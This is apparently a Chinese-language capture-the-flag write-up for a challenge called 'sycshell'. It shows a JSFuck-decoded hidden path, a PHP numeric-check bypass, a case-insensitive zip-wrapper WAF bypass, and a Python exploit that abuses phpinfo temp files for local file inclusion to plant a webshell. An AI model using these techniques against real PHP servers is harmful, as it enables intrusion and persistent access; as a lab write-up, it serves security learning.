---
title: sycshell
date: 2016-05-16
categories: tech
tags: [ctf, writeup]
---


题目地址: http://58.213.63.27:61180/  
<!--more-->

## 表

源文件最后附带了一行注释  
```html
<!-- 内部系统资料：http://sycshell.sycsec.com:61180/ -->
```
将 58.213.63.27 加到 hosts 里, 主页写着Give me your shell.  
还是看源文件, 注释里有jsfuck, 把最后一对括号去掉, 能得到一个函数:
  
```javascript
var test = [][(![]+[]) ... ([][[]]+[])[!+[]+!+[]]));
console.log(test.toString());
//output
function anonymous() {
if(1==2){var tip="/W0Ca1N1CaiBuDa0/read.php?f=index";}else{alert(/No Tip/);}
}
```

## 里
访问 http://sycshell.sycsec.com:61180/W0Ca1N1CaiBuDa0/read.php?f=index  
```php
<?php
show_source(__FILE__);
$pass = @$_GET['pass'];
$a = "syclover";

strlen($pass) > 15 ? die("Don't Hack me!") : "";

if(!is_numeric($pass) || preg_match('/0(x)?|-|\+|\s|^(\.|\d).*$/i',$pass)){
    die('error');
}

if($pass == 1 &&  $a[$pass] === "s"){
    $file = isset($_GET['f']) ? $_GET['f'].'.php' : 'index.php';
    @include $file;
}
```

然后超威蓝猫说pass要这样绕 `pass=%0b.1e1`  
看来要利用包含拿shell, 但是没有上传点.  
tips说有这么一个东西: http://58.213.63.27:61180/phpinfo.php  
于是知道了这个路径: `/home/wwwroot/default/phpinfo.php`, 里面还有一个信息就是 `auto_prepend_file = /home/wwwroot/waf.php`  
用read.php读一下这个waf:  
```php
<?php
if(isset($_GET['f']) && preg_match("/zip|phar/",$_GET['f'],$array)){
	die("SycWaf: Don't Hack me!");
}
```
因为正则没有指定flag i于是用大写就能绕过, 谷歌一下这几个关键词, 发现了 [zip或phar协议包含文件](http://bl4ck.in/index.php/tricks/use-zip-or-phar-to-include-file.html)   

有phpinfo的话可以 `利用phpinfo信息LFI临时文件` (谷歌一下, 已经找不到原出处了)  
于是思路就有了, github一下那篇文章的exp可以发现是真的丑, 于是自己写了个  
```python
import requests
import re
def sycs():
	url='http://sycshell.sycsec.com:61180/W0Ca1N1CaiBuDa0/read.php?pass=%0b.1e1&f=/home/wwwroot/default/phpinfo'
	pd = 'a' * 8
	r = requests.post(url, files={ 'damn':open('out.zip','rb').read() }, headers = {
		'HTTP_ACCEPT': pd,
		'HTTP_USER_AGENT': pd,
		'HTTP_ACCEPT_LANGUAGE': pd,
		'HTTP_PRAGMA': pd
	})
	filename = re.findall(r' (/tmp/.*)',r.content)[0]

	url2 = 'http://sycshell.sycsec.com:61180/W0Ca1N1CaiBuDa0/read.php?pass=%0b.1e1&f=ziP://' + filename + '%23a' # 这会被read.php加上'.php'
	print url2
	r = requests.post(url2)
	txt = r.content
	return txt.find('ok')
i=1
while True:
	i += 1
	r = sycs()
	if r != -1:
		print 'ok' # 在run.php中echo了ok
		break
```

因为一开始代码写错, '#' 应该用 '%23' 表示, 所以参考原脚本加了pd, 后来发现根本没用嘛 ╮(~▽~)╭, 一次成功  

out.zip这样构造:  
```php
<?php
    $file = 'out.zip';
    $phar = new PharData(__DIR__ . '/' . $file, 0, $file, Phar::ZIP);
    $phar->startBuffering();
    $x = file_get_contents('./run.php');
    $phar->addFromString('a.php',$x);
    $phar->stopBuffering();
?>
```
run.php 就是种shell的脚本, 保险起见放在了 /tmp , 毕竟谁都可以写  
最后再用read.php+菜刀一砍, 就拿到了flag  